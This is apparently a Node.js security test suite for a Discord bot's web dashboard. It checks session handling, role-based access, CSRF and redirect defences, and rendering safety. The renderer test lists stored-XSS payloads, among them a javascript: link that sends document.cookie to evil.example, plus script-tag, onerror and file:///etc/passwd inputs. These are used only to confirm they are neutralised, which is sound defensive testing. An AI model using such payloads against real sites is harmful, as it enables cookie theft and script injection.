#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const os = require('os');
const vm = require('vm');
const crypto = require('crypto');
const { EventEmitter } = require('events');

const { start, ROOT } = require('./harness');
const PORT = 39000 + Math.floor(Math.random() * 900);
const BASE = `http://127.0.0.1:${PORT}`;
const PASSWORD = 'test-password-' + Math.random().toString(36).slice(2);

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'sectest-'));
const realDb = path.join(process.env.DATA_DIR || path.join(ROOT, 'data'), 'bot.db');
if (fs.existsSync(realDb)) fs.copyFileSync(realDb, path.join(tmp, 'bot.db'));
fs.mkdirSync(path.join(tmp, 'attachments'), { recursive: true });

process.env.DATA_DIR = tmp;
process.env.PORT = String(PORT);
process.env.DASHBOARD_HOST = '127.0.0.1';
process.env.DASHBOARD_PASSWORD = PASSWORD;
process.env.DASHBOARD_SECRET = 'x'.repeat(64);
process.env.DASHBOARD_COOKIE_SECURE = '0';

const { pass, fail, section, finish } = start();

const CURRENT = { user: null, bot: null };

const { PermissionsBitField } = require('discord.js');

const ROSTER = new Map([
  ['u42', PermissionsBitField.Flags.ManageGuild],
  ['u99', 0n],
  ['uadmin', PermissionsBitField.Flags.Administrator]
]);

function fakeMember(id) {
  if (!ROSTER.has(id)) return null;
  return {
    id,
    displayName: `Tester ${id}`,
    user: { username: `tester-${id}` },
    displayAvatarURL: () => null,
    permissions: new PermissionsBitField(ROSTER.get(id))
  };
}

function forgeSession(uid) {
  const payload = Buffer.from(JSON.stringify({
    exp: Date.now() + 60000, uid, tag: 'tester'
  })).toString('base64url');
  const signature = crypto.createHmac('sha256', process.env.DASHBOARD_SECRET).update(payload).digest('base64url');
  return `dash_session=${payload}.${signature}`;
}

const { Collection } = require('discord.js');

class FakeClient extends EventEmitter {
  constructor() {
    super();
    this.user = { id: '1', tag: 'test#0001', displayAvatarURL: () => '' };
    this.commands = new Collection([
      ['play', { category: 'Music', data: { name: 'play', description: 'παίζει', options: [] } }],
      ['clear', { category: 'Moderation', data: { name: 'clear', description: 'σβήνει', options: [] } }],
      ['invite-logger', { category: 'Invites', data: { name: 'invite-logger', description: 'προσκλήσεις', options: [] } }]
    ]);
    this.voice = { user: null, bot: null };
    this.guilds = {
      cache: new Collection([['g1', {
        id: 'g1', name: 'Test Guild', memberCount: 3,
        iconURL: () => null,
        members: {
          me: { voice: { get channelId() { return CURRENT.bot; } } },
          cache: { get: (id) => fakeMember(id) || undefined },
          fetch: async (id) => { const m = fakeMember(id); if (!m) throw new Error('unknown member'); return m; }
        },
        roles: {
          cache: new Collection([
            ['g1', { id: 'g1', name: '@everyone', color: 0, managed: false, position: 0 }],
            ['555000111222333444', { id: '555000111222333444', name: 'Moderator', color: 0x8b7cff, managed: false, position: 5 }],
            ['555000111222333999', { id: '555000111222333999', name: 'BotRole', color: 0, managed: true, position: 4 }]
          ])
        },
        channels: { cache: new Collection([['c1', { id: 'c1', name: 'welcome' }]]) },
        voiceStates: { cache: { get: (id) => (id === 'u42' && CURRENT.user ? { channelId: CURRENT.user } : undefined) } }
      }]])
    };

    this.player = { nodes: { cache: new Collection(), get: () => null } };
    this.ws = { ping: 42 };
    this.currentTrack = null;
    this.inviteCache = new Collection();
  }
  isReady() { return true; }
}

function testTranscriptRenderer() {
  section('Transcript renderer (stored XSS)');
  const src = fs.readFileSync(path.join(ROOT, 'src/dashboard/views/transcript.ejs'), 'utf8');

  const extract = (name) => {
    const start = src.indexOf(`function ${name}(`);
    if (start === -1) throw new Error(`${name} not found`);
    let depth = 0, i = src.indexOf('{', start);
    for (; i < src.length; i++) {
      if (src[i] === '{') depth++;
      else if (src[i] === '}') { depth--; if (depth === 0) break; }
    }
    return src.slice(start, i + 1);
  };

  const ctx = vm.createContext({});
  vm.runInContext(`${extract('escapeHtml')}\n${extract('renderDiscordLikeText')}`, ctx);
  const render = (s) => vm.runInContext(`renderDiscordLikeText(${JSON.stringify(s)})`, ctx);

  let JSDOM;
  try { ({ JSDOM } = require('jsdom')); }
  catch { return fail('jsdom is missing — the stored-XSS assertions did not run (npm i)'); }

  const SAFE = ['http:', 'https:'];
  const hostile = [
    ['javascript: markdown link', '[click](javascript:alert(1))'],
    ['javascript: without parens', "[x](javascript:location='//evil.example/'+document.cookie)"],
    ['uppercase JAVASCRIPT:', '[x](JAVASCRIPT:alert`1`)'],
    ['data: URI', '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['vbscript:', '[x](vbscript:msgbox(1))'],
    ['file: URI', '[x](file:///etc/passwd)'],
    ['protocol-relative', '[x](//evil.example/x)'],
    ['raw script tag', '<script>alert(1)</script>'],
    ['img onerror', '<img src=x onerror=alert(1)>'],
    ['quote break-out of href', '[x](https://a" onmouseover="alert(1))']
  ];

  for (const [label, input] of hostile) {
    const out = render(input);
    const root = new JSDOM(`<div id="r">${out}</div>`).window.document.getElementById('r');
    const problems = [];
    if (root.querySelector('script')) problems.push('<script> element');
    for (const el of root.querySelectorAll('*')) {
      for (const attr of el.attributes) {
        const ownSpoiler = attr.name === 'onclick' && el.classList.contains('discord-spoiler');
        if (attr.name.startsWith('on') && !ownSpoiler) problems.push(`${el.tagName}[${attr.name}]`);
        if (attr.name === 'href' || attr.name === 'src') {
          const raw = attr.value.trim();
          const scheme = (raw.match(/^([a-z][a-z0-9+.-]*):/i) || [])[1];
          if (scheme && !SAFE.includes(`${scheme.toLowerCase()}:`)) problems.push(`scheme ${scheme}:`);
          if (!scheme && raw.startsWith('//')) problems.push('protocol-relative URL');
        }
      }
    }
    problems.length ? fail(`${label} — ${problems.join(', ')}`) : pass(label);
  }

  const ok = render('[Anthropic](https://anthropic.com) and **bold**');
  /<a href="https:\/\/anthropic\.com"/.test(ok) && ok.includes('<strong>bold</strong>')
    ? pass('legitimate links and formatting still render')
    : fail(`legitimate rendering broke: ${ok}`);
}

async function testHttp() {
  const startDashboard = require(path.join(ROOT, 'src/dashboard/server.js'));
  const database = require(path.join(ROOT, 'src/database.js'));
  const { server } = await startDashboard(new FakeClient(), database);

  section('Every route requires a session');
  for (const route of ['/', '/api/stats', '/transcript/1', '/attachments/', '/commands', '/invites']) {
    const res = await fetch(BASE + route, { redirect: 'manual' });
    const loc = res.headers.get('location') || '';
    (res.status === 401 || (res.status === 302 && loc.startsWith('/login')))
      ? pass(`${route} -> ${res.status}`)
      : fail(`${route} -> ${res.status} (expected 401 or /login redirect)`);
  }

  section('Public login assets');
  const loginCss = await fetch(BASE + '/css/style.css', { redirect: 'manual' });
  const loginCssBody = await loginCss.text();
  (loginCss.status === 200 && /^text\/css\b/.test(loginCss.headers.get('content-type') || '') && loginCssBody.includes('.login-page'))
    ? pass('login stylesheet loads without a session')
    : fail(`login stylesheet -> ${loginCss.status} ${loginCss.headers.get('content-type') || 'no content-type'}`);

  section('State-changing endpoints blocked when signed out');
  const rowsBefore = database.getClearLogs().length;
  const del = await fetch(`${BASE}/api/clear-logs/1`, { method: 'DELETE', redirect: 'manual' });
  del.status === 401 ? pass('DELETE /api/clear-logs -> 401') : fail(`DELETE -> ${del.status}`);
  const ctl = await fetch(`${BASE}/api/player/control`, {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ action: 'stop' }), redirect: 'manual'
  });
  ctl.status === 401 ? pass('POST /api/player/control -> 401') : fail(`control -> ${ctl.status}`);
  database.getClearLogs().length === rowsBefore
    ? pass('database untouched')
    : fail('database changed despite 401');

  section('Login');
  const form = (body) => fetch(`${BASE}/login`, {
    method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body, redirect: 'manual'
  });

  const bad = await form('password=definitely-wrong&next=/');
  bad.status === 401 ? pass('wrong password -> 401') : fail(`wrong password -> ${bad.status}`);

  const good = await form(`password=${encodeURIComponent(PASSWORD)}&next=/`);
  const setCookie = good.headers.get('set-cookie') || '';
  const cookie = setCookie.split(';')[0];
  good.status === 302 && cookie.startsWith('dash_session=')
    ? pass('correct password -> 302 with session cookie')
    : fail(`login -> ${good.status}`);
  for (const attr of ['HttpOnly', 'SameSite=Lax', 'Path=/']) {
    setCookie.includes(attr) ? pass(`cookie has ${attr}`) : fail(`cookie missing ${attr}`);
  }

  !/SameSite=None/i.test(setCookie)
    ? pass('cookie is never SameSite=None')
    : fail('cookie is SameSite=None — it would ride along on any cross-site request');

  {
    const stateChanging = await Promise.all([
      fetch(`${BASE}/api/player/control`, { method: 'GET', headers: { cookie }, redirect: 'manual' }),
      fetch(`${BASE}/api/clear-logs/1`, { method: 'GET', headers: { cookie }, redirect: 'manual' })
    ]);
    stateChanging.every((res) => res.status === 404 || res.status === 405)
      ? pass('nothing that changes state answers a plain GET (so SameSite=Lax still blocks CSRF)')
      : fail(`a state-changing route replied to GET: ${stateChanging.map((r) => r.status).join(', ')}`);
  }

  const evil = await form(`password=${encodeURIComponent(PASSWORD)}&next=//evil.example.com`);
  evil.headers.get('location') === '/'
    ? pass('open redirect via ?next= blocked')
    : fail(`open redirect: ${evil.headers.get('location')}`);

  const forged = await fetch(`${BASE}/api/stats`, {
    headers: { cookie: 'dash_session=eyJleHAiOjk5OTk5OTk5OTk5OTl9.deadbeef' }, redirect: 'manual'
  });
  forged.status === 401 ? pass('tampered cookie rejected') : fail(`tampered cookie -> ${forged.status}`);

  let limited = false;
  for (let i = 0; i < 15 && !limited; i++) limited = (await form(`password=guess${i}`)).status === 429;
  limited ? pass('login brute force rate limited') : fail('no rate limiting on /login');

  section('Signed in');
  for (const route of ['/', '/api/stats']) {
    const res = await fetch(BASE + route, { headers: { cookie }, redirect: 'manual' });
    res.status === 200 ? pass(`${route} -> 200`) : fail(`${route} -> ${res.status} with a valid session`);
  }

  section('Stored file serving');
  const dir = path.join(tmp, 'attachments', 'g1', 'u1');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'x.svg'), '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  const svg = await fetch(`${BASE}/attachments/g1/u1/x.svg`, { headers: { cookie } });
  (svg.headers.get('content-disposition') || '').includes('attachment')
    ? pass('SVG served as a download, not an executable page')
    : fail(`SVG content-disposition: '${svg.headers.get('content-disposition')}'`);
  svg.headers.get('x-content-type-options') === 'nosniff'
    ? pass('SVG has nosniff') : fail('SVG missing nosniff');

  section('Music control needs you in voice');
  {
    const control = (jar) => fetch(`${BASE}/api/player/control`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', cookie: jar },
      body: JSON.stringify({ action: 'toggle-pause', guildId: 'g1' }),
      redirect: 'manual'
    });

    const readBody = async (res) => res.json().catch(() => ({}));

    const passwordOnly = await control(cookie);
    const passwordBody = await readBody(passwordOnly);
    (passwordOnly.status === 403 && passwordBody.reason === 'no-identity')
      ? pass('a password-only session cannot touch the music')
      : fail(`password-only session -> ${passwordOnly.status} ${passwordBody.reason}`);

    const identified = forgeSession('u42');

    CURRENT.user = null; CURRENT.bot = null;
    const away = await control(identified);
    const awayBody = await readBody(away);
    (away.status === 403 && awayBody.reason === 'not-in-voice')
      ? pass('signed in but outside voice -> refused')
      : fail(`outside voice -> ${away.status} ${awayBody.reason}`);

    CURRENT.user = 'vc-b'; CURRENT.bot = 'vc-a';
    const elsewhere = await control(identified);
    const elsewhereBody = await readBody(elsewhere);
    (elsewhere.status === 403 && elsewhereBody.reason === 'other-channel')
      ? pass('in a different channel than the bot -> refused')
      : fail(`other channel -> ${elsewhere.status} ${elsewhereBody.reason}`);

    CURRENT.user = 'vc-a'; CURRENT.bot = 'vc-a';
    const together = await control(identified);
    together.status !== 403
      ? pass('same channel as the bot -> the gate opens')
      : fail('same channel was still refused');

    CURRENT.user = 'vc-a'; CURRENT.bot = null;
    const botIdle = await control(identified);
    botIdle.status !== 403
      ? pass('bot not in voice -> any voice channel of that server is enough')
      : fail('bot idle but the gate stayed shut');

    const stats = await fetch(`${BASE}/api/stats?guildId=g1`, { headers: { cookie } });
    const payload = await stats.json();
    (payload.canControl === false && payload.controlReason === 'no-identity')
      ? pass('the sync payload tells the UI why the buttons are dead')
      : fail(`sync payload said canControl=${payload.canControl} reason=${payload.controlReason}`);
  }

  section('Dashboard follows Discord roles');
  {
    const manager = forgeSession('u42');
    const plain = forgeSession('u99');
    const admin = forgeSession('uadmin');

    const get = (path, jar) => fetch(BASE + path, { headers: { cookie: jar }, redirect: 'manual' });

    const managerOverview = await get('/?guildId=g1', manager);
    managerOverview.status === 200
      ? pass('Manage Server -> sees the overview')
      : fail(`Manage Server overview -> ${managerOverview.status}`);

    const plainOverview = await get('/?guildId=g1', plain);
    plainOverview.status === 403
      ? pass('a member with no roles -> no dashboard at all')
      : fail(`plain member overview -> ${plainOverview.status}`);

    const managerTranscripts = await get('/clearlogs?guildId=g1', manager);
    managerTranscripts.status === 403
      ? pass('Manage Server is NOT enough for deleted messages')
      : fail(`manager /clearlogs -> ${managerTranscripts.status}`);

    const adminTranscripts = await get('/clearlogs?guildId=g1', admin);
    adminTranscripts.status === 200
      ? pass('Administrator -> deleted messages')
      : fail(`admin /clearlogs -> ${adminTranscripts.status}`);

    const managerApi = await get('/api/clear-logs?guildId=g1', manager);
    managerApi.status === 403
      ? pass('the transcripts API is gated too, not just the page')
      : fail(`manager /api/clear-logs -> ${managerApi.status}`);

    const managerPerms = await get('/permissions?guildId=g1', manager);
    managerPerms.status === 403
      ? pass('only Administrator manages permissions')
      : fail(`manager /permissions -> ${managerPerms.status}`);

    const adminPerms = await get('/permissions?guildId=g1', admin);
    adminPerms.status === 200
      ? pass('Administrator reaches the permissions page')
      : fail(`admin /permissions -> ${adminPerms.status}`);
  }

  section('Overrides beat roles');
  {
    const manager = forgeSession('u42');
    database.setDashboardPermission('g1', 'u42', 'transcripts', true);
    const granted = await fetch(`${BASE}/clearlogs?guildId=g1`, { headers: { cookie: manager }, redirect: 'manual' });
    granted.status === 200
      ? pass('an ON override grants what the role does not')
      : fail(`granted /clearlogs -> ${granted.status}`);

    database.setDashboardPermission('g1', 'u42', 'invites', false);
    const revoked = await fetch(`${BASE}/invites?guildId=g1`, { headers: { cookie: manager }, redirect: 'manual' });
    revoked.status === 403
      ? pass('an OFF override revokes what the role allows')
      : fail(`revoked /invites -> ${revoked.status}`);

    const write = await fetch(`${BASE}/api/permissions?guildId=g1`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', cookie: manager },
      body: JSON.stringify({ userId: 'u99', capability: 'transcripts', value: 'on' })
    });
    write.status === 403
      ? pass('a non-admin cannot hand out permissions')
      : fail(`non-admin write -> ${write.status}`);

    database.setDashboardPermission('g1', 'u42', 'transcripts', null);
    database.setDashboardPermission('g1', 'u42', 'invites', null);
  }

  section('Discord login plumbing');
  {
    const disabled = await fetch(`${BASE}/auth/discord`, { redirect: 'manual' });
    (disabled.status === 302 && (disabled.headers.get('location') || '').startsWith('/login'))
      ? pass('OAuth route is inert while it is not configured')
      : fail(`/auth/discord -> ${disabled.status} ${disabled.headers.get('location')}`);

    const callback = await fetch(`${BASE}/auth/discord/callback?code=x&state=forged`, { redirect: 'manual' });
    const issued = (callback.headers.get('set-cookie') || '');
    !issued.includes('dash_session=ey')
      ? pass('a forged state never gets a session')
      : fail(`callback handed out a session: ${issued.slice(0, 60)}`);
  }

  section('Clearing the whole history stays inside one server');
  {
    const admin = forgeSession('uadmin');
    const manager = forgeSession('u42');

    database.logClear({ id: 'm', tag: 'm#1' }, { id: 'c', name: 'gen' }, { id: 'g1', name: 'Test' }, [{ id: '1', content: 'a' }]);
    database.logClear({ id: 'm', tag: 'm#1' }, { id: 'c', name: 'gen' }, { id: 'g1', name: 'Test' }, [{ id: '2', content: 'b' }]);
    database.logClear({ id: 'm', tag: 'm#1' }, { id: 'c', name: 'gen' }, { id: 'g-elsewhere', name: 'Other' }, [{ id: '3', content: 'c' }]);

    const refused = await fetch(`${BASE}/api/clear-logs?guildId=g1`, { method: 'DELETE', headers: { cookie: manager } });
    refused.status === 403
      ? pass('Manage Server cannot wipe the deleted-message history')
      : fail(`manager clear all -> ${refused.status}`);

    const before = database.getClearLogsByGuild('g-elsewhere').length;
    const done = await fetch(`${BASE}/api/clear-logs?guildId=g1`, { method: 'DELETE', headers: { cookie: admin } });
    const body = await done.json().catch(() => ({}));

    (done.status === 200 && body.deleted >= 2)
      ? pass('an Administrator clears this server history')
      : fail(`admin clear all -> ${done.status} deleted=${body.deleted}`);

    database.getClearLogsByGuild('g1').length === 0
      ? pass('this server is empty afterwards')
      : fail('records survived the clear');

    database.getClearLogsByGuild('g-elsewhere').length === before
      ? pass('and the other server keeps everything it had')
      : fail('the clear reached another server');
  }

  section('Removing a person from the exceptions list');
  {
    const admin = forgeSession('uadmin');
    const manager = forgeSession('u42');

    database.setDashboardPermission('g1', '123456789012345678', 'transcripts', true);
    database.setDashboardPermission('g1', '123456789012345678', 'invites', false);
    database.setDashboardPermission('g1', 'u42', 'invites', false);

    const refused = await fetch(`${BASE}/api/permissions/123456789012345678?guildId=g1`, {
      method: 'DELETE', headers: { cookie: manager }
    });
    refused.status === 403
      ? pass('a non-admin cannot wipe someone else exceptions')
      : fail(`non-admin delete -> ${refused.status}`);

    const bad = await fetch(`${BASE}/api/permissions/not-an-id?guildId=g1`, {
      method: 'DELETE', headers: { cookie: admin }
    });
    bad.status === 400 ? pass('a malformed id is rejected') : fail(`bad id -> ${bad.status}`);

    const done = await fetch(`${BASE}/api/permissions/123456789012345678?guildId=g1`, {
      method: 'DELETE', headers: { cookie: admin }
    });
    const body = await done.json().catch(() => ({}));
    (done.status === 200 && body.removed === 2)
      ? pass('an Administrator clears every override that person had')
      : fail(`admin delete -> ${done.status} removed=${body.removed}`);

    Object.keys(database.getDashboardPermissions('g1', '123456789012345678')).length === 0
      ? pass('and the person follows their roles again')
      : fail('overrides survived the delete');

    Object.keys(database.getDashboardPermissions('g1', 'u42')).length === 1
      ? pass('nobody else was touched')
      : fail('the delete reached another person');

    database.setDashboardPermission('g1', 'u42', 'invites', null);
  }

  section('Navigation can swap pages without reloading the shell');
  {
    const admin = forgeSession('uadmin');
    const page = await fetch(`${BASE}/clearlogs?guildId=g1`, { headers: { cookie: admin } });
    const html = await page.text();

    html.includes('<main class="main">')
      ? pass('every page exposes the region navigation swaps')
      : fail('no main.main to swap');

    html.includes('data-page-script')
      ? pass('page scripts are tagged so they can be re-run after a swap')
      : fail('the page script is not tagged');

    const scriptTags = html.split('<script').filter((chunk) => chunk.includes('live-sync'));
    const liveSyncTagged = scriptTags.some((chunk) => chunk.split('>')[0].includes('data-page-script'));
    !liveSyncTagged
      ? pass('the socket layer is NOT tagged, so it never runs twice')
      : fail('live-sync would be re-executed on every navigation');

    html.includes('name="color-scheme" content="dark"')
      ? pass('the browser is told to paint dark, so a real reload cannot flash white')
      : fail('no color-scheme hint');

    const perms = await fetch(`${BASE}/permissions?guildId=g1`, { headers: { cookie: admin } });
    const permsHtml = await perms.text();
    permsHtml.includes('nowPlayingBar')
      ? pass('the shell is identical on every page, so swapping is always valid')
      : fail('the permissions page is missing the shell');
  }

  section('Nothing asks with the browser box any more');
  {
    const admin = forgeSession('uadmin');

    const pages = ['clearlogs', 'permissions', 'invites'];
    const rendered = {};
    for (const name of pages) {
      const res = await fetch(`${BASE}/${name}?guildId=g1`, { headers: { cookie: admin } });
      rendered[name] = await res.text();
    }

    // Το window. πρέπει να μπει μέσα στο μοτίβο: σκέτη απαγόρευση τελείας πριν
    // άφηνε το window.confirm( — αυτό ακριβώς που ψάχνουμε — να ξεφύγει.
    const native = /(?:^|[^\w$.])(?:window\.)?(?:confirm|alert|prompt)\s*\(/;
    const offenders = pages.filter((name) => native.test(rendered[name]));
    offenders.length === 0
      ? pass('no page falls back to the grey "dash.thomast.uk says" box')
      : fail(`native dialog still in: ${offenders.join(', ')}`);

    const shell = rendered.clearlogs;
    const confirmTags = shell.split('<script').filter((chunk) => chunk.includes('confirm.js'));
    confirmTags.length === 1
      ? pass('the shared dialog is loaded once, by the shell')
      : fail(`confirm.js appears ${confirmTags.length} times`);

    !confirmTags[0]?.split('>')[0].includes('data-page-script')
      ? pass('and is never re-run on a swap, so its Escape handler stays single')
      : fail('confirm.js is tagged as a page script');

    pages.every((name) => rendered[name].includes('dashboardConfirm'))
      ? pass('every destructive page asks through it')
      : fail('a page deletes without asking');
  }

  section('Locking a command down is an Administrator job');
  {
    const manager = forgeSession('u42');
    const admin = forgeSession('uadmin');
    const MOD_ROLE = '555000111222333444';

    const json = (cookie, method, url, body) => fetch(`${BASE}${url}`, {
      method,
      headers: body
        ? { cookie, 'Content-Type': 'application/json' }
        : { cookie },
      body: body ? JSON.stringify(body) : undefined
    });

    const asManager = await json(manager, 'POST', '/api/command-access?guildId=g1', {
      command: 'clear', principalId: MOD_ROLE, principalType: 'role'
    });
    asManager.status === 403
      ? pass('Manage Server cannot decide who runs a command')
      : fail(`manager lock -> ${asManager.status}`);

    const music = await json(admin, 'POST', '/api/command-access?guildId=g1', {
      command: 'play', principalId: MOD_ROLE, principalType: 'role'
    });
    music.status === 400
      ? pass('a command outside Moderation/Admin/Invites is refused')
      : fail(`play lock -> ${music.status}`);

    const foreign = await json(admin, 'POST', '/api/command-access?guildId=g1', {
      command: 'clear', principalId: '999888777666555444', principalType: 'role'
    });
    foreign.status === 400
      ? pass('a role from somewhere else is refused, it could never apply here')
      : fail(`foreign role -> ${foreign.status}`);

    const junk = await json(admin, 'POST', '/api/command-access?guildId=g1', {
      command: 'clear', principalId: 'not-an-id', principalType: 'user'
    });
    junk.status === 400
      ? pass('and so is anything that is not a Discord id')
      : fail(`junk id -> ${junk.status}`);

    const allowed = await json(admin, 'POST', '/api/command-access?guildId=g1', {
      command: 'clear', principalId: MOD_ROLE, principalType: 'role'
    });
    const allowedBody = await allowed.json().catch(() => ({}));
    allowed.status === 200 && allowedBody.ok
      ? pass('an Administrator can hand the command to a role')
      : fail(`admin lock -> ${allowed.status}`);

    database.isAuthorizedPrincipal('g1', 'clear', 'someone', [MOD_ROLE])
      ? pass('and the gate honours it for every member of that role')
      : fail('the role was stored but the gate ignores it');

    !database.isAuthorizedPrincipal('g1', 'clear', 'someone', [])
      ? pass('while everyone else is now locked out')
      : fail('the lock does not bite');

    const stored = allowedBody.access?.find((entry) => entry.name === 'clear');
    stored?.restricted && stored.principals[0]?.type === 'role' && stored.principals[0]?.name === 'Moderator'
      ? pass('the answer names the role, so the page can redraw without a reload')
      : fail('the response does not describe the new state');

    const managerUnlock = await json(manager, 'DELETE', '/api/command-access/clear?guildId=g1');
    managerUnlock.status === 403
      ? pass('Manage Server cannot unlock it either')
      : fail(`manager unlock -> ${managerUnlock.status}`);

    const dropOne = await json(admin, 'DELETE', `/api/command-access/clear/${MOD_ROLE}?guildId=g1`);
    dropOne.status === 200 && !database.hasAuthorizedEntriesForCommand('g1', 'clear')
      ? pass('an Administrator can take it back')
      : fail(`admin revoke -> ${dropOne.status}`);
  }

  section('Turning invite announcements off');
  {
    const manager = forgeSession('u42');
    const admin = forgeSession('uadmin');

    database.setInviteLogChannel('g1', 'c1');

    const asManager = await fetch(`${BASE}/api/invite-channel?guildId=g1`, {
      method: 'DELETE', headers: { cookie: manager }
    });
    asManager.status === 403 && database.getInviteLogChannel('g1') === 'c1'
      ? pass('Manage Server can read the invites page but not silence it')
      : fail(`manager disable -> ${asManager.status}`);

    const page = await fetch(`${BASE}/invites?guildId=g1`, { headers: { cookie: manager } });
    const html = await page.text();
    html.includes('#welcome')
      ? pass('the page still says where the announcements go')
      : fail('the invites page does not show the channel');
    // Το id υπάρχει και μέσα στο script της σελίδας· μόνο το markup του
    // κουμπιού δείχνει αν όντως προσφέρεται σε κάποιον.
    !html.includes('id="disableInviteChannelBtn"')
      ? pass('but offers no button to whoever cannot use it')
      : fail('the disable button is shown to a non-Administrator');

    const adminPage = await fetch(`${BASE}/invites?guildId=g1`, { headers: { cookie: admin } });
    (await adminPage.text()).includes('id="disableInviteChannelBtn"')
      ? pass('an Administrator does get the button')
      : fail('the disable button is missing for an Administrator');

    const asAdmin = await fetch(`${BASE}/api/invite-channel?guildId=g1`, {
      method: 'DELETE', headers: { cookie: admin }
    });
    asAdmin.status === 200 && database.getInviteLogChannel('g1') === null
      ? pass('an Administrator can')
      : fail(`admin disable -> ${asAdmin.status}`);
  }

  section('The command list reads by category');
  {
    const admin = forgeSession('uadmin');
    const page = await fetch(`${BASE}/commands?guildId=g1`, { headers: { cookie: admin } });
    const html = await page.text();

    html.includes('command-group-title')
      ? pass('the list is broken into groups with a heading each')
      : fail('no category headings');

    // Το tab έστελνε την ελληνική ετικέτα, που δεν ταίριαζε με καμία κατηγορία,
    // οπότε το «Όλες» άδειαζε τη λίστα.
    html.includes(`filterCommands('all'`)
      ? pass('the "all" tab passes a key, not its Greek label')
      : fail('the all tab still passes a label — it would empty the list');

    !html.includes(`category === 'All'`)
      ? pass('and nothing compares against the old mismatched constant')
      : fail("filterCommands still compares to 'All'");

    ['play', 'clear', 'invite-logger'].every((name) => html.includes(`/${name}`))
      ? pass('every command is on the page')
      : fail('a command is missing from the list');
  }

  section('Inline handlers can actually be reached');
  {
    // Τα onclick εκτελούνται σε global scope. Κάθε script σελίδας είναι τυλιγμένο
    // σε IIFE, οπότε μια σκέτη function μέσα του είναι αόρατη — το κουμπί
    // φαίνεται κανονικό και δεν κάνει τίποτα.
    const viewsDir = path.join(ROOT, 'src/dashboard/views');
    const orphans = [];

    for (const file of fs.readdirSync(viewsDir).filter((name) => name.endsWith('.ejs'))) {
      const source = fs.readFileSync(path.join(viewsDir, file), 'utf8');
      const handlers = new Set();

      for (const match of source.matchAll(/on[a-z]+="([A-Za-z_$][\w$]*)\s*\(/g)) {
        if (match[1] !== 'this') handlers.add(match[1]);
      }

      for (const name of handlers) {
        if (!source.includes(`window.${name} =`)) orphans.push(`${file}:${name}`);
      }
    }

    orphans.length === 0
      ? pass('every inline handler is assigned to window, so the button does something')
      : fail(`handler defined out of reach: ${orphans.join(', ')}`);
  }

  section('The layout rules the dropdown and the grouping depend on');
  {
    const css = fs.readFileSync(path.join(ROOT, 'src/dashboard/public/css/style.css'), 'utf8');

    // Η λίστα εντολών γίνεται grid 2-3 στηλών· χωρίς αυτό η επικεφαλίδα πιάνει
    // ένα κελί και οι κατηγορίες σκορπίζονται ανάμεσα στις κάρτες.
    /\.command-group-title\s*\{[^}]*grid-column:\s*1\s*\/\s*-1/.test(css)
      ? pass('a category heading spans every column of the list')
      : fail('the heading does not span the grid — categories would scatter');

    // Το main έχει transform από το page-in, οπότε ένα fixed μενού θα κρεμόταν
    // από εκείνο και όχι από το viewport.
    !/\.perm-drop-menu\s*\{[^}]*position:\s*fixed/.test(css)
      ? pass('the dropdown stays absolute, anchored to its own control')
      : fail('a fixed menu would hang off the transformed main, not the viewport');

    // Το overflow και το backdrop-filter του πίνακα έκοβαν και εγκλώβιζαν το μενού.
    // Υπάρχουν πολλοί κανόνες .perm-table· μετράει αν κάποιος τα ορίζει.
    const permTable = (css.match(/\.perm-table\s*\{[^}]*\}/g) || []).join('');
    /overflow:\s*visible/.test(permTable)
      ? pass('the permissions table does not clip an open menu')
      : fail('the permissions table would cut the dropdown in half');

    /backdrop-filter:\s*none/.test(permTable)
      ? pass('and does not trap it in its own stacking context')
      : fail('the glass backdrop-filter would bury the dropdown');
  }

  section('The dropdown helper is shared, not per page');
  {
    const admin = forgeSession('uadmin');
    const page = await fetch(`${BASE}/permissions?guildId=g1`, { headers: { cookie: admin } });
    const html = await page.text();

    const tags = html.split('<script').filter((chunk) => chunk.includes('dropdown.js'));
    tags.length === 1
      ? pass('loaded once, by the shell')
      : fail(`dropdown.js appears ${tags.length} times`);

    !tags[0]?.split('>')[0].includes('data-page-script')
      ? pass('and never re-runs on a navigation, so its listeners stay single')
      : fail('dropdown.js is tagged as a page script');

    !/closest\('\.perm-drop'\)\)\s*closeAll/.test(html)
      ? pass('no page closes dropdowns on its own — that shut the other section too')
      : fail('a page still has its own outside-click handler');
  }

  section('Adding a person hands them access, it does not deny it');
  {
    const admin = forgeSession('uadmin');
    const page = await fetch(`${BASE}/permissions?guildId=g1`, { headers: { cookie: admin } });
    const html = await page.text();

    // 'track' έγραφε ό,τι είχε ήδη ο χρήστης — δηλαδή ρητό «Όχι» σε όποιον δεν
    // έβλεπε τίποτα, που είναι το αντίθετο του «Προσθήκη».
    !/save\(userId, capabilities\[0\], 'track'\)/.test(html)
      ? pass('the add form no longer stores a denial')
      : fail('adding someone writes an explicit "no" for the very thing you are granting');

    const newcomer = '123456789012345670';
    const response = await fetch(`${BASE}/api/permissions?guildId=g1`, {
      method: 'POST',
      headers: { cookie: admin, 'Content-Type': 'application/json' },
      body: JSON.stringify({ userId: newcomer, capability: 'view', value: 'on' })
    });
    const body = await response.json().catch(() => ({}));

    response.status === 200 && body.effective?.view === true
      ? pass('a person with no roles at all can be given the overview')
      : fail(`granting view -> ${response.status} view=${body.effective?.view}`);

    const listed = database.listDashboardPermissions('g1').some((row) => row.user_id === newcomer);
    listed
      ? pass('and they show up in the exceptions list')
      : fail('the person was granted but is not listed');

    await fetch(`${BASE}/api/permissions/${newcomer}?guildId=g1`, { method: 'DELETE', headers: { cookie: admin } });
  }

  section('The page admits that login is a separate gate');
  {
    const admin = forgeSession('uadmin');
    const page = await fetch(`${BASE}/permissions?guildId=g1`, { headers: { cookie: admin } });
    const html = await page.text();

    // Δίνεις δικαιώματα σε ένα ID και δεν συμβαίνει τίποτα, γιατί ο λογαριασμός
    // κόβεται στο login — που ορίζεται αλλού.
    html.includes('DASHBOARD_ALLOWED_USERS')
      ? pass('it says where the login list lives, so granting here is not mistaken for access')
      : fail('nothing tells you that permissions do not grant a login');

